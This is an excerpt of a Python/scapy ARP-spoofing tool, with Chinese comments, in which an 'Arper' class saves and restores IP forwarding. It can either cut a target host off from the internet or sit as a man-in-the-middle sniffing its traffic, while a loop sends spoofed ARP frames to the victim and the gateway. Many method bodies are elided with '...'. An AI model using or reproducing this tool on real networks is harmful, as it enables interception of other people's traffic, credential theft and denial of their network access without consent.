import threading
from scapy.all import (ARP, Ether, conf, send, srp, wrpcap, sniff, sendp)
import os
import sys
import time
import platform
...
class Arper:
    ...
    def setup_ip_forwarding(self):
        ...
        try:
            # 获取当前IP转发状态
            self.original_forward_state = self.get_current_ip_forwarding_state()
            print(f"📝 当前IP转发状态: {'启用' if self.original_forward_state else '禁用'}")
    ...
    def get_current_ip_forwarding_state(self):
        """获取当前IP转发状态"""
        try:
            if platform.system() == "Windows":
                ...
                return "启用" in result.stdout or "enabled" in result.stdout.lower()
            else:
    ...
    def restore_ip_forwarding(self):
        ...
        try:
            if self.original_forward_state is not None:
                ...
                print(f"✅ IP转发已恢复为原始状态: {'启用' if self.original_forward_state else '禁用'}")
        except Exception as e:
    ...
    def run(self):
        ...
        try:
            ...
            if self.block_internet:
                ...
                print("💡 IP转发已禁用，目标主机无法通过网关访问外部网络")
            else:
                print("👁️ 中间人模式 - 目标主机可以正常上网，流量被嗅探")
                print("💡 IP转发已启用，目标主机可以正常上网")
    ...
    def poison(self):
        ...
        try:
            ...
            while self._running:
                ...
                sendp(poison_victim, verbose=False, iface=self.interface)
                sendp(poison_gateway, verbose=False, iface=self.interface)
